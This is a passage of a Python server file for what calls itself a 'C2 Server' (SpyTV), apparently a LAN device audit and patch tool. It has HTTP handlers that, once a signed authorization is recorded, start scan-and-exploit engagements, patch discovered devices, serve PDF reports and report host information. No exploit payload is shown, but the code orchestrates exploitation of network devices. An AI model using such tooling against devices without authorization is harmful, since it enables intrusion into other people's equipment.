                                                    signature_png, signed_at)
            pdf = build_authorization_pdf(client, auth_id,
                                          signature_png=signature_png,
                                          signer_ip=signer_ip,
                                          signed_at=signed_at,
                                          record_hash=record_hash)
            out_dir = _auth_dir(auth_id)
            with open(os.path.join(out_dir, "authorization-signed.pdf"),
                      "wb") as f:
                f.write(pdf)
            rec.update({"signed": True, "signed_at": signed_at,
                        "signer_ip": signer_ip, "record_hash": record_hash})
            save_authorization(auth_id, rec)

            eng = AuditEngagement(
                cidr=str(data.get("cidr") or "").strip() or None,
                scan_fn=lambda cidr: perform_scan(cidr, cve_scanner),
                check_fn=lambda ip: check_target(ip, cve_scanner),
                exploit_fn=lambda tv_type, ip: run_exploit(tv_type, ip),
                kill_fn=lambda ips: kill_all_connections(ips),
                client=client,
            )
            with engagements_lock:
                if audit_engagement is not None and audit_engagement.running:
                    raced = True
                else:
                    audit_engagement = eng
                    raced = False
            if raced:
                self.send_json(409, {"error": "An audit engagement is "
                                              "already running."})
                return
            rec["report_id"] = eng.report_id
            save_authorization(auth_id, rec)
            eng.start()

            self.send_json(200, {
                "status": "started",
                "auth_id": auth_id,
                "report_id": eng.report_id,
                "record_hash": record_hash,
                "signed_pdf_url": f"/api/audit/authorization.pdf?"
                                  f"auth_id={auth_id}&state=signed",
                "status_url": "/api/audit/status",
            })
        except json.JSONDecodeError as e:
            self.send_json(400, {"error": str(e)})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_patch_start(self):
        """POST /api/patch/start — begin patching every discovered device.
        The client details are collected afterwards (report stage)."""
        global patch_engagement
        try:
            with engagements_lock:
                busy_audit = (audit_engagement is not None
                              and audit_engagement.running)
                busy_patch = (patch_engagement is not None
                              and patch_engagement.running)
            if busy_audit:
                self.send_json(409, {"error": "An audit engagement is running "
                                              "— let it finish first."})
                return
            if busy_patch:
                self.send_json(409, {"error": "A patch engagement is already "
                                              "running."})
                return

            def targets_fn():
                # Fresh discovery so patch-all covers every device on the
                # LAN, then merge in registered devices the scan missed.
                try:
                    findings = perform_scan(None, cve_scanner)
                except Exception:  # noqa: BLE001
                    findings = []
                targets = [{"ip": f["ip"], "tv_type": f.get("tv_type"),
                            "name": f.get("name") or f.get("device_type"),
                            "source": "scan"}
                           for f in findings if f.get("ip")]
                known = {t["ip"] for t in targets}
                with devices_lock:
                    regs = list(devices.values())
                for d in regs:
                    if d.get("ip") and d["ip"] not in known:
                        targets.append({
                            "ip": d["ip"], "tv_type": d.get("tv_type"),
                            "name": d.get("name") or d.get("family"),
                            "source": "registry", "device_id": d.get("id"),
                        })
                return targets

            def patch_fn(ip, tv_type):
                result = execute_patches(ip, tv_type, cve_scanner)
                fully = bool(result["total"]) and result["ok"] == result["total"]
                with devices_lock:
                    for dev in devices.values():
                        if dev.get("ip") == ip:
                            dev["patched"] = fully
                            dev["patched_at"] = utc_now_iso()
                            dev["patched_cves"] = result["cves_fixed"]
                save_devices()  # acquires devices_lock itself — outside the block
                return result

            eng = PatchEngagement(targets_fn=targets_fn, patch_fn=patch_fn)
            with engagements_lock:
                if patch_engagement is not None and patch_engagement.running:
                    raced = True
                else:
                    patch_engagement = eng
                    raced = False
            if raced:
                self.send_json(409, {"error": "A patch engagement is already "
                                              "running."})
                return
            eng.start()
            self.send_json(200, {"status": "started",
                                 "report_id": eng.report_id,
                                 "status_url": "/api/patch/status"})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_patch_report(self):
        """POST /api/patch/report — client details in, remediation PDF out."""
        try:
            data = self._read_json_body()
            client, errors = validate_client(data.get("client") or data)
            if errors:
                self.send_json(400, {"error": "Invalid client details",
                                     "errors": errors})
                return
            with engagements_lock:
                eng = patch_engagement
            if eng is None:
                self.send_json(404, {"error": "No patch engagement has been "
                                              "started."})
                return
            if eng.report_path:
                self.send_json(409, {"error": "The remediation report has "
                                              "already been rendered.",
                                     "report_url": "/api/patch/report.pdf"})
                return
            if eng.running and eng.phase != "awaiting_client":
                self.send_json(409, {"error": "The patch engagement is still "
                                              "running."})
                return
            eng.render(client)
            self.send_json(200, {
                "status": "ok",
                "report_id": eng.report_id,
                "report_url": "/api/patch/report.pdf",
                "summary": eng.results.get("summary", {}),
            })
        except json.JSONDecodeError as e:
            self.send_json(400, {"error": str(e)})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_audit_status(self):
        with engagements_lock:
            eng = audit_engagement
        self.send_json(200, eng.snapshot() if eng
                       else _idle_engagement("audit"))

    def serve_patch_status(self):
        with engagements_lock:
            eng = patch_engagement
        self.send_json(200, eng.snapshot() if eng
                       else _idle_engagement("patch"))

    def serve_engagement_report(self, kind):
        """GET /api/{audit|patch}/report.pdf — the rendered engagement PDF."""
        with engagements_lock:
            eng = audit_engagement if kind == "audit" else patch_engagement
        path = eng.report_path if eng else None
        if not path or not os.path.exists(path):
            self.send_json(404, {"error": "Report not ready yet."})
            return
        label = "Audit" if kind == "audit" else "Patch"
        filename = f"{eng.report_id}-{label}-Report.pdf"
        self.send_file(path, filename, disposition="attachment")

    def serve_authorization_pdf(self):
        """GET /api/audit/authorization.pdf?auth_id=…[&state=unsigned|signed]
        — the Rules of Engagement instrument (pre-signature or executed)."""
        query = parse_qs(urlparse(self.path).query)
        auth_id = (query.get("auth_id", [""])[0] or "").strip()
        state = (query.get("state", [""])[0] or "").strip().lower()
        rec = load_authorization(auth_id) if auth_id else None
        out_dir = _auth_dir(auth_id) if auth_id else None
        if not rec or not out_dir:
            self.send_json(404, {"error": "Unknown authorization id"})
            return
        signed_path = os.path.join(out_dir, "authorization-signed.pdf")
        unsigned_path = os.path.join(out_dir, "authorization.pdf")
        if state == "signed":
            path = signed_path if os.path.exists(signed_path) else None
        elif state == "unsigned":
            path = unsigned_path if os.path.exists(unsigned_path) else None
        elif os.path.exists(signed_path):
            path = signed_path
        else:
            path = unsigned_path if os.path.exists(unsigned_path) else None
        if not path:
            self.send_json(404, {"error": "Authorization document not found"})
            return
        suffix = "-Signed" if path == signed_path else ""
        self.send_file(path, f"SpyTV-Authorization-{auth_id}{suffix}.pdf",
                       disposition="inline")

    def send_file(self, path, filename, disposition="inline"):
        try:
            with open(path, "rb") as f:
                data = f.read()
        except IOError:
            self.send_json(404, {"error": "File not found"})
            return
        ctype = ("application/pdf" if str(path).endswith(".pdf")
                 else "application/octet-stream")
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Disposition",
                         f'{disposition}; filename="{filename}"')
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def serve_host_info(self):
        """GET /api/host_info — real host facts for the Server tab
        (nothing simulated: hostname, OS, Python, MAC, uptime)."""
        try:
            hostname = socket.gethostname()
            try:
                ipv6 = socket.getaddrinfo(hostname, None, socket.AF_INET6)[0][4][0]
            except (socket.gaierror, OSError, IndexError):
                ipv6 = None
            mac = ":".join(f"{b:02x}" for b in
                           uuid.UUID(int=uuid.getnode()).bytes[-6:])
            self.send_json(200, {
                "hostname": hostname,
                "local_ip": get_local_ip(),
                "ipv6": ipv6 or "—",
                "mac": mac,
                "os": f"{platform.system()} {platform.release()} {platform.version()}".strip(),
                "python": platform.python_version(),
                "platform": platform.platform(),
                "c2_port": C2_PORT,
                "started_at": SERVER_STARTED_AT,
                "uptime_s": max(0, int(time.time() - SERVER_STARTED_MONO)),
            })
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_kill_connections(self):
        """POST /api/connections/kill — real teardown: close every tracked
        socket, terminate exploit child tools and verify the connection
        table of this process."""
        try:
            result = kill_all_connections(None)
            self.send_json(200, {"status": "ok", "result": result})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def send_json(self, code, data):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())


def main():
    load_devices()
    load_commands()
    load_scans()

    # Auto-update the CVE feed on every C2 start (background — NVD is
    # rate-limited, so the server comes up immediately). New entries are
    # logged to CVE_UPDATES.log in the repo root and appear in the feed.
    def _startup_cve_update():
        cve_feed_status["updating"] = True
        try:
            new = update_cve_database()
            cve_feed_status["new"] = len(new)
            cve_feed_status["last_result"] = (
                f"{len(new)} new CVE(s) ingested" if new else "No new CVEs")
            print(f"[CVE] startup update: {cve_feed_status['last_result']} "
                  f"(CVE_UPDATES.log)")
        except Exception as e:  # noqa: BLE001
            cve_feed_status["last_result"] = f"error: {e}"
            print(f"[CVE] startup update failed (feed still available): {e}")
        finally:
            cve_feed_status["updating"] = False

    print("Starting CVE feed update in background...")
    threading.Thread(target=_startup_cve_update, daemon=True).start()

    server = HTTPServer((C2_HOST, C2_PORT), C2Handler)
    local_ip = get_local_ip()
    print(f"C2 Server running on http://{C2_HOST}:{C2_PORT}")
    print(f"Local IP: {local_ip}")
    print(f"Dashboard: http://{local_ip}:{C2_PORT}/")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down C2...")
        server.shutdown()


if __name__ == "__main__":
    main()
